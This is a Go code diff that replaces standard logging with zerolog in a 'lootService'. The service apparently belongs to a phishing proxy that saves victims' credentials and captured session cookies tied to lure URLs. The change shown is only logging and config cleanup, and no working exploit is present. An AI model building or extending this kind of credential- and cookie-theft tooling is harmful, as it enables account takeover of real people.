@@ -1,7 +1,6 @@
 package main
 
 import (
-	"log"
 	"net/http"
 	"net/url"
 	"os"
@@ -12,6 +11,7 @@ import (
 	"time"
 
 	"github.com/gofiber/fiber/v2"
+	"github.com/rs/zerolog"
 	"go.uber.org/multierr"
 	"gopkg.in/yaml.v3"
 )
@@ -153,7 +153,7 @@ type LootService interface {
 	SaveCreds(c *fiber.Ctx, info *APILoginInfo) error
 }
 
-func NewLootService(credsRepo CredsRepository, sessionRepo SessionRepository,
+func NewLootService(log *zerolog.Logger, credsRepo CredsRepository, sessionRepo SessionRepository,
 	sessionCookies []*SessionCookieConfig) *lootService {
 	cookieAllRegexp := getDomainCookieNamesRegexp(sessionCookies)
 
@@ -166,6 +166,7 @@ func NewLootService(credsRepo CredsRepository, sessionRepo SessionRepository,
 	cookieRequiredRegexp := getDomainCookieNamesRegexp(requiredCookies)
 
 	return &lootService{
+		log:                  log,
 		credsRepo:            credsRepo,
 		sessionRepo:          sessionRepo,
 		cookieAllRegexp:      cookieAllRegexp,
@@ -195,6 +196,7 @@ func getDomainCookieNamesRegexp(cookies []*SessionCookieConfig) map[string]*rege
 }
 
 type lootService struct {
+	log         *zerolog.Logger
 	credsRepo   CredsRepository
 	sessionRepo SessionRepository
 	// cookieAllRegexp contains map from cookie domain name to regexp that matches
@@ -296,7 +298,7 @@ func (s *lootService) SaveCookies(c *fiber.Ctx, destURL *url.URL, cookies []*htt
 		s.saveCookie(sessCtx, destURL, cookie)
 	}
 	if len(sessCtx.requiredCookies) == s.requiredCookiesNum {
-		log.Printf("lureURL: %s sid: %s session cookies are captured!\n", sess.LureURL(), sess.ID())
+		s.log.Info().Str("lureURL", sess.LureURL()).Str("sid", sess.ID()).Msg("session cookies are captured!")
 		err = s.saveCapturedSession(sess, sessCtx)
 		sessCtx.isAuthenticated = true
 	}
@@ -441,5 +443,3 @@ func (s *multiCookieSaver) SaveCookies(c *fiber.Ctx, destURL *url.URL, cookies [
 
 // DB_TYPE = file / redis
 // DB_URL =
-// CREDS_FILE = creds.jsonl
-// COOKIES_FILE = cookies.jsonl
